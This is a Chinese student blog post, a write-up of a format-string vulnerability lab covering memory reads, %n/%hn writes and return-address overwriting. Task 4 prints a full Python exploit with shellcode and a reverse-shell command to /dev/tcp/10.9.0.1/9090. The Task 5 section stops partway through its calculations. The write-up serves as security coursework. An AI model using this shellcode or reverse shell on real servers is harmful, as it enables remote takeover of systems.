@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Format-String lab - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2021-05-12 18:35">
+      2021年5月12日 晚上
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>是通过printf系列的变量来执行恶意代码等</p>
+<blockquote>
+<p>The way how the input data is fed into the printf() function is unsafe, and it leads to a format-string vulnerability</p>
+<p>最终目标是将代码注入到服务器程序的堆栈中，然后触发代码</p>
+</blockquote>
+<h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>针对第一个task，有两个方法：1 是针对于不能读的地方进行读取，2 是针对于不能写的地方进行写</p>
+<p><img src="/2021/05/12/Format-String-lab-1/1.PNG" srcset="/img/loading.gif" alt="1"></p>
+<p>但是运行后发现会return properly，仔细分析后发现是由于%d只是简单的访问栈上面中的参数，并且把参数换成10进制来输出，并不会访问什么不该访问的</p>
+<p>所以，我们通过%s来进行攻击</p>
+<p><img src="/2021/05/12/Format-String-lab-1/2.PNG" srcset="/img/loading.gif" alt="2"></p>
+<p>可以发现此时没有正确的return</p>
+<h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><p>在这一题里面，我们想让程序不能正确返回的思路是正确的，读取内存当中不能被读取的内容或者往内存当中不能写的地方写</p>
+<p>printf函数原型</p>
+<p><img src="/2021/05/12/Format-String-lab-1/3.PNG" srcset="/img/loading.gif" alt="3"></p>
+<h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><blockquote>
+<p>此任务的目标是让服务器从内存中打印出一些数据（我们将继续使用10.9.0.5）。数据将在服务器端打印出来，因此攻击者无法看到它。因此，这不是一个有意义的攻击，但此任务中使用的技术对于后续任务至关重要。</p>
+</blockquote>
+<h4 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h4><p>此时，buffer作为局部变量是放在栈上面的，一共有1500个字节，在这里，我们需要知道在format string和buf起始地址之间的相对偏移量</p>
+<p>首先，我们能够知道bufferr在栈上面的位置是<code>0xffffd660</code></p>
+<p><img src="/2021/05/12/Format-String-lab-1/4.PNG" srcset="/img/loading.gif" alt="4"></p>
+<p>原本想着是通过gdb调试来看到printf里面的return address，后来发现是自己傻了，那么多次调用printf，怎么看。。。</p>
+<p>后来就直接通过调整%x的数量来看了。。。</p>
+<p>当为%数量为64的时候，发现会正好</p>
+<p><img src="/2021/05/12/Format-String-lab-1/5.PNG" srcset="/img/loading.gif" alt="5">)<img src="/2021/05/12/Format-String-lab-1/6.PNG" srcset="/img/loading.gif" alt="6"></p>
+<p>也就是说，buffer起始的字符串会是第64个参数</p>
+<h4 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h4><p>在这里的话，就是需要我们来打印作为全局变量存放在heap当中的secret字符串</p>
+<pre><code class="hljs c"><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">"A secret message\n"</span>;</code></pre>
+
+<p>最开始想到的就是%s，然后将format string上面的第一个参数设置为&amp;secret，但是问题怎么进行修改</p>
+<p>之后想到能直接读取第64位的参数，而这个参数正好是buffer的起始位置</p>
+<p>我们根据提示能够得到对应的在heap当中的地址</p>
+<p><img src="/2021/05/12/Format-String-lab-1/7.PNG" srcset="/img/loading.gif" alt="7"></p>
+<p>然后构造payload</p>
+<p><img src="/2021/05/12/Format-String-lab-1/9.PNG" srcset="/img/loading.gif" alt="9"></p>
+<p>可以看到，对应字符串内容被打印出来了</p>
+<p><img src="/2021/05/12/Format-String-lab-1/8.PNG" srcset="/img/loading.gif" alt="8"></p>
+<h4 id="复盘-1"><a href="#复盘-1" class="headerlink" title="复盘"></a>复盘</h4><p>这个task当中最开始的目标就是打印出来对应的数据，注意在printf当中打印的规则，首先会将buffer当中的常规的字符打印出来，而遇到对应的占位符的时候，会根据参数来进行解析，以%s为例，当在buffer中遇到的时候，会来解析，比如将第一个参数对应存储位置里面的数据作为地址来进行寻址，然后打印出内存当中对应位置的字符串</p>
+<h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p>这个task的目标是修改对应的target的值/一些影响程序执行的值，首先明确target是存放在heap当中的，然后根据提示信息来获取target的位置信息</p>
+<p><img src="/2021/05/12/Format-String-lab-1/10.PNG" srcset="/img/loading.gif" alt="10"></p>
+<p>可以看到地址为<code>0x080e5068</code></p>
+<h4 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value"></a>Task 3.A: Change the value to a different value</h4><p>修改内存当中数据的一个重要方式是通过%n</p>
+<p>构造payload</p>
+<p><img src="/2021/05/12/Format-String-lab-1/12.PNG" srcset="/img/loading.gif" alt="12"></p>
+<p><img src="/2021/05/12/Format-String-lab-1/11.PNG" srcset="/img/loading.gif" alt="11"></p>
+<p>可以看到对应的target的值已经从原来的0x11223344变成了0x4</p>
+<h4 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h4><p>因为我们现在只是通过%n将对应的位置修改为了0x4，而目标是修改为0x5000，</p>
+<blockquote>
+<p>这里我们需要定向修改，因此必须输出额外的字符作为填充。这里我们插入了%1276x（1276 = 0x4FC = 0x500 - 0x4），程序会把输出的值强制扩展到1276位</p>
+</blockquote>
+<p>构造payload</p>
+<p><img src="/2021/05/12/Format-String-lab-1/114.PNG" srcset="/img/loading.gif" alt="114"></p>
+<p><img src="/2021/05/12/Format-String-lab-1/13.PNG" srcset="/img/loading.gif" alt="13"></p>
+<h4 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD"></a>Task 3.C: Change the value to 0xAABBCCDD</h4><blockquote>
+<p>当我们需要把内存中的某个值修改为一个非常大的数时，如果直接使用%n写入的话，那么需要提前输出数量巨大的字符，这会消耗非常多的时间，因而，如果我们希望改写一个地址，最好使用%hn，他一次写入两个字节而非四个，此外还有%hhn，一次写入一个字节<br>于是，我们试图向0x080e5068和0x080e506A中分别写入0xCCDD和0xAABB此时问题出现了：当我们需要把内存中的某个值修改为一个非常小的数时，因为我们在前面必须输出一些字符以确定修改的地址，那么看上去，我们所能修改的值看上去是有下界的（比如在这里，看上去我们不能实现小于8的值的写入），但是实际上，我们可以通过溢出来解决这个问题——因为我们只写两个字节，所以0x0000和0x10000的效果是一样的，因此高低地址要填充的字节数可以如下计算：<br>低地址 ： low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8 = 65528<br>高地址 ： high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adr = 65433</p>
+</blockquote>
+<p>在这里，我们所需要算的是0XCCDD - 8 = 52,437，0xAABB - 0xCCDD = 56,798（注意借位）</p>
+<p>构造payload</p>
+<p><img src="/2021/05/12/Format-String-lab-1/16.PNG" srcset="/img/loading.gif" alt="16"></p>
+<p><img src="/2021/05/12/Format-String-lab-1/15.PNG" srcset="/img/loading.gif" alt="15"></p>
+<h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>Q1：我们可以根据提示信息来获取buffer的起始位置为<code>0xffffd650</code></p>
+<p>我们先来通过gdb来找myprintf中return 的地址</p>
+<p><img src="/2021/05/12/Format-String-lab-1/17.PNG" srcset="/img/loading.gif" alt="17"></p>
+<p>所以return address当中应该放的是0x8049f7e</p>
+<p>之后来找return address的内存位置，根据之前打印的stack上面的情况，可以看到return address所在位置是第11个参数，与buffer起始位置相距212个字节，之后相减，0xffffd650 - 0xd4 = 0xFFFFD57C</p>
+<p>Q2：64个%x</p>
+<p>构造payload</p>
+<p>此时，将shellcode放在距离buffer起始位置0x100处，地址位0xffffd750</p>
+<p>其中，0xFFFFD57C需要存放0xd750，- 8后需要填充55112，而较高位0xFFFFD57E需要存放0xFFFF，需要填充0xFFFF - 0xD750 = 0x28AF =10415</p>
+<pre><code class="hljs c">#!/usr/bin/python3
+<span class="hljs-keyword">import</span> sys
+
+# <span class="hljs-number">32</span>-<span class="hljs-built_in">bit</span> Generic Shellcode 
+shellcode_32 = (
+   <span class="hljs-string">"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"</span>
+   <span class="hljs-string">"\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"</span>
+   <span class="hljs-string">"\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"</span>
+   <span class="hljs-string">"/bin/bash*"</span>
+   <span class="hljs-string">"-c*"</span>
+   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *
+  #<span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>
+   <span class="hljs-string">"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *"</span>
+   <span class="hljs-string">"AAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>
+   <span class="hljs-string">"BBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>
+   <span class="hljs-string">"CCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>
+   <span class="hljs-string">"DDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>
+).encode('latin-1')
+
+
+# <span class="hljs-number">64</span>-<span class="hljs-built_in">bit</span> Generic Shellcode 
+shellcode_64 = (
+   <span class="hljs-string">"\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"</span>
+   <span class="hljs-string">"\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"</span>
+   <span class="hljs-string">"\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"</span>
+   <span class="hljs-string">"\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"</span>
+   <span class="hljs-string">"/bin/bash*"</span>
+   <span class="hljs-string">"-c*"</span>
+   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *
+   <span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>
+   <span class="hljs-string">"AAAAAAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>
+   <span class="hljs-string">"BBBBBBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>
+   <span class="hljs-string">"CCCCCCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>
+   <span class="hljs-string">"DDDDDDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>
+).encode('latin-1')
+
+N = <span class="hljs-number">1500</span>
+# Fill the content with NOP<span class="hljs-number">'</span>s
+content = bytearray(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i in range(N))
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_32
+
+# Put the shellcode somewhere in the payload
+start = <span class="hljs-number">0x100</span>             # Change <span class="hljs-keyword">this</span> number
+content[start:start + len(shellcode)] = shellcode
+
+############################################################
+#
+#    Construct the format <span class="hljs-built_in">string</span> here
+# 
+############################################################
+
+ret_low = <span class="hljs-number">0xFFFFD57C</span>
+content[0:4]  =  (ret_low).to_bytes(4,byteorder='little')
+ret_high = <span class="hljs-number">0xFFFFD57E</span>
+content[4:8]  =  (ret_high).to_bytes(4,byteorder='little')
+
+s = <span class="hljs-string">"%55112x%64$hn%10415x%65$hn"</span>
+fmt  = (s).encode('latin-1')
+content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+len(fmt)] = fmt
+
+# Save the format <span class="hljs-built_in">string</span> to file
+with open('badfile', 'wb') as f:
+  f.<span class="hljs-built_in">write</span>(content)</code></pre>
+
+<p><img src="/2021/05/12/Format-String-lab-1/18.PNG" srcset="/img/loading.gif" alt="18"></p>
+<p>可以看到reverse shell成功</p>
+<h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><p>您的工作是构造有效负载以利用服务器的格式字符串漏洞。您的最终目标是在目标服务器上获得一个根shell。</p>
+<p>首先就是先打印出来栈上面的信息</p>
+<p><img src="/2021/05/12/Format-String-lab-1/19.PNG" srcset="/img/loading.gif" alt="19"></p>
+<p>然后发现buffer起始位置是第34个参数</p>
+<p>然后开始找return address的位置，根据提示信息中的frame pointer来找，frame pointer是0x00007fffffffe4c0，所以return address所在的位置就应该是0x00007fffffffe4c8</p>
+<h4 id="问题-amp-解决"><a href="#问题-amp-解决" class="headerlink" title="问题&amp;解决"></a>问题&amp;解决</h4><p>printf在遇一个字节的0的时候会停止解析，<strong>解决方法就是将对应的地址放在buffer的比较高的地方</strong></p>
+<p>要修改位于<code>0x00007fffffffe4c8</code>的return address的值，仍然将shellcode放在距离buffer0x100的地方，所以此时shellcode的起始位置是<code>0x00007fffffffe680</code></p>
+<p>所以0x00007fffffffe4c8的低两位需要放0xe680，0x00007fffffffe4cA的中两位需要放0xffff，0x00007fffffffe4cc的高两位放0x7fff，最高位放0x0000</p>
+<p>计算对应值：</p>
+<p>首先0xe680</p>
+<p><a href="https://blog.csdn.net/zhengqijun_/article/details/72454714" target="_blank" rel="noopener">printf 函数实现的深入剖析</a></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Software-security/">Software security</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">生物技术实验报告</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/07/The-information-of-School/">
+                        <span class="hidden-mobile">The information of School</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Format-String lab&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
